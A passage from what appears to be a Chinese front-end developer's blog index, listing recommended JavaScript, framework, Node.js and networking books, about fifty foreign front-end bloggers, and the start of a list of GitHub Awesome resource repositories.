/>前端开发最值得阅读的书籍之一，也就是传说中的红宝书。书中详尽讨论了 JavaScript 的各个方面，从 JavaScript 的起源开始，逐步讲解到新出现的技术，其中重点介绍 ECMAScript 和 DOM 标准。适合所有阶段的前端开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035706383-3cda7e63-3520-4bbf-83ae-ee95252c754a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035706383-3cda7e63-3520-4bbf-83ae-ee95252c754a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）JavaScript 权威指南（第 7 版）</strong><br />前端开发最值得阅读的书籍之一，也就是传说中的犀牛书。本书介绍 JavaScript 语言和由浏览器与 Node 实现的 JavaScript API。本书的目标是全面地讲解 JavaScript 语言，对 JavaScript 程序中可能用到的重要的客户端 API 和服务器端 API 提供深入的介绍。本书适合有一定编程经验、想学习 JavaScript 读者，也适合已经在使用 JavaScript 但希望更深入地理解进而真正掌握这门语言的程序员。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035808873-99977386-1b0d-4ea2-8d07-06000549d563.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035808873-99977386-1b0d-4ea2-8d07-06000549d563.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）你不知道的 JavaScript（上卷+中卷+下卷）</strong><br />“你不知道的 JavaScript”系列就是要让不求甚解的 JavaScript 开发人迎难而上，深入语言内部，弄清楚 JavaScript 每一个零部件的用途，轻松理解前端圈里出现的各种技术、框架和流行术语。本书既适合 JavaScript 语言初学者阅读，又适合经验丰富的前端开发人员深入学习。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035855288-ea746d0c-c823-4515-a07b-381c4888a8c0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035855288-ea746d0c-c823-4515-a07b-381c4888a8c0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（4）ES6 标准入门（第 3 版）</strong><br />本书根据 ES2017 标准，详尽介绍了所有新增的语法，对基本概念、设计目的和用法进行了清晰的讲解，给出了大量简单易懂的示例。其难度适中，适合那些已经对 JavaScript 有一定了解的读者。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034225247-7de272da-3c7f-463a-89a5-5dd75a06d773.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034225247-7de272da-3c7f-463a-89a5-5dd75a06d773.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（5）深入理解 ES6</strong><br />本书对 ES6 的各种新特性进行了系统性的讲解，可以帮助我们加深对 ES6 的理解，并深入学期其原理。适合对 JavaScript 有一定了解的读者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034647804-bd4cbc53-5cae-4fb7-a3ef-5defa34cb2e4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034647804-bd4cbc53-5cae-4fb7-a3ef-5defa34cb2e4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（6）JavaScript 忍者秘籍（第 2 版）</strong><br />本书介绍了如何掌握 JavaScript 核心的概念，诸如函数、闭包、对象、原型和 promise，同时还介绍了 JavaScript API， 包括 DOM、事件和计时器。对 JavaScript 底层进行深入讲解，适合初学者和进阶 JavaScript 的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665055877997-7f3450fd-2d9a-4ef7-810d-efbfe2ddb5ec.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665055877997-7f3450fd-2d9a-4ef7-810d-efbfe2ddb5ec.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（7）高性能 JavaScript</strong><br />本书揭示的技术和策略能帮助你在开发过程中消除性能瓶颈。你将会了解如何提升各方面的性能，包括代码的加载、运行、DOM 交互、页面生存周期等。本书介绍了页面代码加载的最佳方法和编程技巧，来帮助你编写更为高效和快速的代码。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036731509-8222c25d-9c26-4208-88a4-d37718318533.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036731509-8222c25d-9c26-4208-88a4-d37718318533.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>3. 框架</strong><br /><strong>（1）Vue.js 设计与实现</strong><br />本书由 Vue.js 官方团队成员霍春阳倾力打造，基于 Vue 3 深入解析 Vue.js 设计细节，从规范出发，以源码为基础，并结合大量直观的配图，循序渐进地讲解 Vue.js 中各个功能模块的实现，细致剖析框架设计原理。适合有一定 Vue 开发经验的的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665032981895-1d1323a6-2d5a-4a18-a7fb-5545f5a4871e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665032981895-1d1323a6-2d5a-4a18-a7fb-5545f5a4871e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）深入 React 技术栈</strong><br />本书从几个维度去介绍 React。一是作为 View 库，它怎么实现组件化，以及它背后的实现原理。二是扩展到 Flux 应用架构及重要的衍生品 Redux，它们怎么与 React 结合做应用开发。三是对 React 与 server 的碰撞产生的一些思考。四是讲述它在可视化方面的优势与劣势。 适合有一定经验的前端开发人员阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036938300-3b8eea8d-96a6-4870-a868-378f0f8e072a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036938300-3b8eea8d-96a6-4870-a868-378f0f8e072a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>4. Node.js</strong><br /><strong>（1）深入浅出 Node.js</strong><br />从不同的视角介绍了 Node 内在的特点和结构。主要内容包含模块机制的揭示、异步 I&#x2F;O 实现原理的展现、异步编程的探讨、内存控制的介绍、二进制数据 Buffer 的细节、Node 中的网络编程基础、Node 中的 Web 开发、进程间的消息传递、Node 测试以及通过 Node 构建产品需要的注意事项。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033889916-46c2f325-cc41-47dd-89e3-af4f51369f64.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033889916-46c2f325-cc41-47dd-89e3-af4f51369f64.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Node 与 Express 开发</strong><br />本书系统讲解了使用 Express 开发动态 Web 应用的流程和步骤。不仅讲授了开发公共站点及 REST API 的基础知识，同时还讲解了构建单页、多页及混合 Web 应用的规划方式及实践。适合所有前端开发人员阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036805641-11ca2f16-65a9-4442-b5fb-31a2442b0654.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036805641-11ca2f16-65a9-4442-b5fb-31a2442b0654.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）狼书：更了不起的 Node.js（卷 1、卷 2）</strong><br />本书讲解了 Node.js 的基础知识、开发调试方法、源码原理和应用场景，旨在向读者展示如何通过新的 Node.js 和 npm 编写出更具前端特色、更具工程化优势的代码。本书还讲解了 Node.js 中相当核心且复杂的异步流程控制，展望了未来异步流程的发展方向。对于了解 Node.js 在企业中如何应用很有帮助。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034100330-127e3638-c128-4aeb-a6d3-c349e4028338.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034100330-127e3638-c128-4aeb-a6d3-c349e4028338.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>**5. TypeScript **<br /><strong>（1）深入理解 TypeScript</strong><br />本书涵盖了 TypeScript 的大部分知识点，并对其进行了细致的讲解。本书还对 TypeScript 编译原理进行了深入的剖析，对高级编程技巧、编译原理进行了深入浅出的解读，适合入门 TypeScript 的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665037519581-2b13e4c4-7198-4a6b-ab0f-9f20c723b3e9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665037519581-2b13e4c4-7198-4a6b-ab0f-9f20c723b3e9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>6. 设计模式</strong><br /><strong>（1）JavaScript 设计模式与开发实践</strong><br />本书针对 JavaScript 语言特性全面介绍了更适合前端程序员的了 16 个常用的设计模式，讲解了 JavaScript 面向对象和函数式编程方面的基础知识，介绍了面向对象的设计原则及其在设计模式中的体现，还分享了面向对象编程技巧和日常开发中的代码重构。本书将教会你如何把经典的设计模式应用到 JavaScript 中，编写出优美高效、结构化和可维护的代码。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033011075-582bdcab-6cf8-4ad2-a812-cbbef6a78e26.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033011075-582bdcab-6cf8-4ad2-a812-cbbef6a78e26.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）重构 改善既有代码的设计</strong><br />书中清晰揭示了重构的过程，解释了重构的原理和佳实践方式，并给出了何时以及何地应该开始挖掘代码以求改善。书中给出了 60 多个可行的重构，每个重构都介绍了一种经过验证的代码变换手法的动机和技术。本书提出的重构准则将帮助开发人员一次一小步地修改代码，从而减少了开发过程中的风险。适合有一定前端开发经验的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036485041-f8e0f70e-81f2-4744-a746-f6db1a978775.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036485041-f8e0f70e-81f2-4744-a746-f6db1a978775.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>7. 计算机网络</strong><br /><strong>（1）图解 HTTP</strong><br />本书对 HTTP 协议进行了全面系统的介绍。作者由 HTTP 协议的发展历史娓娓道来，严谨细致地剖析了 HTTP 协议的结构，列举诸多常见通信场景及实战案例，最后延伸到 Web 安全、全新技术动向等方面。在讲解的同时，辅以大量生动形象的通信图例，更好地帮助读者深刻理解 HTTP 通信过程中客户端与服务器之间的交互情况。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033422151-44c10d81-8139-421b-8f1b-e51079201449.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033422151-44c10d81-8139-421b-8f1b-e51079201449.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）图解 TCP&#x2F;IP（第 5 版）</strong><br />本书讲解了网络基础知识、TCP&#x2F;IP 基础知识、数据链路、IP 协议、IP 协议相关技术、TCP 与 UDP、路由协议、应用协议、网络安全等内容，适合初学者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033721819-8956de02-0274-4b04-9c12-7bee1d1465ae.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665033721819-8956de02-0274-4b04-9c12-7bee1d1465ae.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）HTTP 权威指南</strong><br />本书详细解释了 HTTP 协议，探讨了 HTTP 有效工作所依赖的所有其他核心因特网技术。本书的本质是理解 Web 的工作原理，以及如何将这些知识应用到 Web 编程和管理之中去，主要涵盖 HTTP 的技术运作方式、产生动机、性能和目标，以及一些相关技术问题。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035361863-83c0189e-426d-48d6-80cb-2c1b38ea1c06.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035361863-83c0189e-426d-48d6-80cb-2c1b38ea1c06.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>8. 数据结构与算法</strong><br /><strong>（1）数据结构与算法 JavaScript 描述</strong><br />本书是用 JavaScript 描述数据结构与算法的开山之作，通过丰富的示例，向读者透彻讲解了在 JavaScript 环境下，如何通过一系列存储机制（包括链表、栈、队列和图）高效地达到编程目的。学习数据结构与算法可以提高逻辑思维能力和解决问题的能力。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036133327-64f4276b-316e-42ce-b510-25d3b7663679.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036133327-64f4276b-316e-42ce-b510-25d3b7663679.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）我的第一本算法书</strong><br />本书采用大量图片，通过详细的分步讲解，以直观、易懂的方式展现了 7 个数据结构和 26 个基础算法的基本原理。本书通过大量的步骤图帮助读者加深对数据结构原理和算法执行过程的理解，便于学习和记忆。将本书作为算法入门的第一步，是非常不错的选择。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665037303618-daab8274-4ce3-4e6c-a10e-1e6fe9ab0743.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665037303618-daab8274-4ce3-4e6c-a10e-1e6fe9ab0743.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>9. 计算机基础</strong><br /><strong>（1）计算机是怎样跑起来的</strong><br />本书以图配文，以计算机的三大原则为开端、相继介绍了计算机的结构、手工汇编、程序流程、算法、数据结构、面向对象编程、数据库、TCP&#x2F;IP 网络、数据加密、XML、计算机系统开发以及 SE 的相关知识。适合想要扩展计算机基础知识的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036594756-2c81e4eb-7c1f-46c1-b4f1-dd3ff45adc57.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665036594756-2c81e4eb-7c1f-46c1-b4f1-dd3ff45adc57.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 书籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国外前端博主</title>
      <link href="/2023/06/30/frontend/collection/guo-wai-qian-duan-bo-zhu/"/>
      <url>/2023/06/30/frontend/collection/guo-wai-qian-duan-bo-zhu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><ol><li>Ahmad Shadeed，主要分享 CSS 相关文章：<a href="https://ishadeed.com/">https://ishadeed.com/</a></li><li>Iskander Samatov，主要分享 TypeScript、React 相关文章：<a href="https://isamatov.com/">https://isamatov.com/</a></li><li>Nadia Makarevich，主要分享 React 相关文章：<a href="https://www.developerway.com/">https://www.developerway.com/</a></li><li>有很多优秀博主共同分享，主要分享 JavaScript 原理相关文章：<a href="https://blog.sessionstack.com/how-javascript-works/home">https://blog.sessionstack.com/how-javascript-works/home</a></li><li>Aleksandr Hovhannisyan，一个比较综合的博客：<a href="https://www.aleksandrhovhannisyan.com/">https://www.aleksandrhovhannisyan.com/</a></li><li>Bramus Van Damme，主要分享 CSS 相关文章：<a href="https://www.bram.us/">https://www.bram.us/</a></li><li>Lydia Hallie，作品集：<a href="https://www.lydiahallie.io/">https://www.lydiahallie.io/</a></li><li>Lydia Hallie，还是这个 23 岁的宝藏博主写的设计模式和组件模式的书：<a href="https://www.patterns.dev/">https://www.patterns.dev/</a></li><li>Bitbucket，主要分享 Git 相关知识：<a href="https://www.atlassian.com/git">https://www.atlassian.com/git</a></li><li>有很多优秀博主共同分享，主要分享框架进阶的知识：<a href="https://blog.openreplay.com/">https://blog.openreplay.com/</a></li><li>全网每日热门文章：<a href="https://app.daily.dev/">https://app.daily.dev/</a></li><li>有众多博主分享前端各类文章，质量比较高：<a href="https://blog.logrocket.com/">https://blog.logrocket.com/</a></li><li>Dr. Axel Rauschmayer，主要分享 JavaScript 相关文章：<a href="https://2ality.com/index.html">https://2ality.com/index.html</a></li><li>Victoria Lo，主要分享 React 相关文章：<a href="https://lo-victoria.com/">https://lo-victoria.com/</a></li><li>技术博主汇总平台：<a href="https://tech-blogs.dev/">https://tech-blogs.dev/</a></li><li>Chak Shun Yu，主要分享 React 相关文章，质量很高：<a href="https://www.chakshunyu.com/blog/">https://www.chakshunyu.com/blog/</a></li><li>Tapas Adhikary，主要分享前端开发技巧和进阶知识：<a href="https://blog.greenroots.info/">https://blog.greenroots.info/</a></li><li>Steven，主要分享偏基础的文章：<a href="https://lumin8media.com/">https://lumin8media.com/</a></li><li>Suhail Kakar，全栈开发，分享内容比较综合：<a href="https://blog.suhailkakar.com/">https://blog.suhailkakar.com/</a></li><li>inDepthDev，深入学习前端系列，框架相关较多：<a href="https://indepth.dev/">https://indepth.dev/</a></li><li>前端性能优化相关的理论：<a href="https://requestmetrics.com/web-performance/">https://requestmetrics.com/web-performance/</a></li><li>Alex Kondov，主要分享 React 文章，文章很硬核，必读：<a href="https://alexkondov.com/articles/">https://alexkondov.com/articles/</a></li><li>JoshWComeau，主要分享 CSS 文章：<a href="https://www.joshwcomeau.com/">https://www.joshwcomeau.com/</a></li><li>Daily Dev Tips，日更博主，分享前端各类文章：<a href="https://daily-dev-tips.com/archive/">https://daily-dev-tips.com/archive/</a></li><li>Ben Nadel，全栈开发，JavaScript 相关值得一看： <a href="https://www.bennadel.com/blog/complete-blog-entry-list.htm">https://www.bennadel.com/blog/complete-blog-entry-list.htm</a></li><li>David Walsh，分享各类文章：<a href="https://davidwalsh.name/">https://davidwalsh.name/</a></li><li>Amelia Wattenberger，分享 React 和可视化：<a href="https://wattenberger.com/blog">https://wattenberger.com/blog</a></li><li>Lee Robinson，分享 React 相关文章：<a href="https://leerob.io/">https://leerob.io/</a><br />29.Tania Rascia，分享各类文章：<a href="https://www.taniarascia.com/blog/">https://www.taniarascia.com/blog/</a></li><li>Writing JavaScript，主要分享 JavaScript 文章：<a href="https://writingjavascript.com/">https://writingjavascript.com/</a></li><li>Maxime，各类文章：<a href="https://blog.maximeheckel.com/">https://blog.maximeheckel.com/</a></li><li>Stefan，各类文章：<a href="https://www.stefanjudis.com/">https://www.stefanjudis.com/</a></li><li>Chameera Dulanga，文章必看：<a href="https://chameeradulanga.medium.com/">https://chameeradulanga.medium.com/</a></li><li>Piumi Liyana Gunawardhana，主要分享 React 相关文章：<a href="https://piumi-16.medium.com/">https://piumi-16.medium.com/</a></li><li>技术社区，内容偏向 CSS，设计：<a href="https://www.smashingmagazine.com/">https://www.smashingmagazine.com/</a></li><li>技术社区，各类前端文章，质量较高：<a href="https://blog.bitsrc.io/">https://blog.bitsrc.io/</a></li><li>Async blog，各类前端文章：<a href="https://www.loginradius.com/blog/async/">https://www.loginradius.com/blog/async/</a></li><li>Stephanie Eckles，主要分享 CSS 文章：<a href="https://moderncss.dev/">https://moderncss.dev/</a></li><li>Devtrium，分享 React、TypeScript 文章：<a href="https://devtrium.com/">https://devtrium.com/</a></li><li>ALEX DEVERO：<a href="https://blog.alexdevero.com/">https://blog.alexdevero.com/</a></li><li>Flavio Copes：<a href="https://flaviocopes.com/">https://flaviocopes.com/</a></li><li>Bhagya Vithana：<a href="https://bhagya-16.medium.com/">https://bhagya-16.medium.com/</a></li><li>Dan Abramov，React 团队核心成员：<a href="https://overreacted.io/">https://overreacted.io/</a></li><li>Todd H. Gardner，分享性能优化相关：<a href="https://toddhgardner.medium.com/">https://toddhgardner.medium.com/</a></li><li>Temani Afif，主要分享 CSS 相关文章：<a href="https://dev.to/afif">https://dev.to/afif</a></li><li>Sass 风格指南：<a href="https://sass-guidelin.es/zh/">https://sass-guidelin.es/zh/</a></li><li>分享各类文章：<a href="https://ordinarycoders.com/blog/articles">https://ordinarycoders.com/blog/articles</a></li><li>TK，JavaScript 相关: <a href="https://www.iamtk.co/">https://www.iamtk.co/</a></li><li>RisingStack，Node.js 相关：<a href="https://blog.risingstack.com/">https://blog.risingstack.com/</a></li><li>Journal： <a href="https://yagmurcetintas.com/">https://yagmurcetintas.com/</a></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> blog </tag>
            
            <tag> 国外 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Awesome</title>
      <link href="/2023/06/30/frontend/collection/projects/awesome/"/>
      <url>/2023/06/30/frontend/collection/projects/awesome/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>GitHub 上的 Awesome 系列是一个汇总了优秀工具和资源的大集合。下面就来分享 Awesome 系列中关于前端的项目！<br /><strong>●Awesome HTML5：</strong><a href="https://github.com/diegocard/awesome-html5">https://github.com/diegocard/awesome-html5</a><br /><strong>●Awesome CSS：</strong><a href="https://github.com/awesome-css-group/awesome-css">https://github.com/awesome-css-group/awesome-css</a><br /><strong>●Awesome JavaScript：</strong><a href="https://github.com/sorrycc/awesome-javascript">https://github.com/sorrycc/awesome-javascript</a><br /><strong>●Awesome TypeScript：</strong><a href="https://github.com/semlinker/awesome-typescript">https://github.com/semlinker/awesome-typescript</a><br /><strong>●Awesome Vue.js：</strong><a href="https://github.com/vuejs/awesome-vue">https://github.com/vuejs/awesome-vue</a><br /><strong>●Awesome React：</strong><a href="https://github.com/enaqx/awesome-react">https://github.com/enaqx/awesome-react</a><br /><strong>●Awesome React Hooks：</strong><a href="https://github.com/rehooks/awesome-react-hooks">https://github.com/rehooks/awesome-react-hooks</a><br /><strong>●Awesome React Components：</strong><a href="https://github.com/brillout/awesome-react-components">https://github.com/brillout/awesome-react-components</a><br /><strong>●Awesome Angular：</strong><a href="https://github.com/PatrickJS/awesome-angular">https://github.com/PatrickJS/awesome-angular</a><br /><strong>●Awesome Nodejs：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a><br /><strong>●Awesome wechat weapp：</strong><a href="https://github.com/justjavac/awesome-wechat-weapp">https://github.com/justjavac/awesome-wechat-weapp</a><br /><strong>●Awesome Webpack：</strong><a href="https://webpack.js.org/awesome-webpack/">https://webpack.js.org/awesome-webpack/</a><br /><strong>●Awesome Vite.js：</strong><a href="https://github.com/vitejs/awesome-vite">https://github.com/vitejs/awesome-vite</a><br /><strong>●Awesome Electron：</strong><a href="https://github.com/sindresorhus/awesome-electron">https://github.com/sindresorhus/awesome-electron</a><br /><strong>●Awesome React Native：</strong><a href="https://github.com/jondot/awesome-react-native">https://github.com/jondot/awesome-react-native</a><br /><strong>●Awesome Lowcode：</strong><a href="https://github.com/taowen/awesome-lowcode">https://github.com/taowen/awesome-lowcode</a><br /><strong>●Awesome Flutter：</strong><a href="https://github.com/Solido/awesome-flutter">https://github.com/Solido/awesome-flutter</a><br /><strong>●Awesome Rust：</strong><a href="https://github.com/rust-unofficial/awesome-rust">https://github.com/rust-unofficial/awesome-rust</a><br /><strong>●Awesome Next.js：</strong><a href="https://github.com/unicodeveloper/awesome-nextjs">https://github.com/unicodeveloper/awesome-nextjs</a><br /><strong>●Awesome Nuxt.js：</strong><a 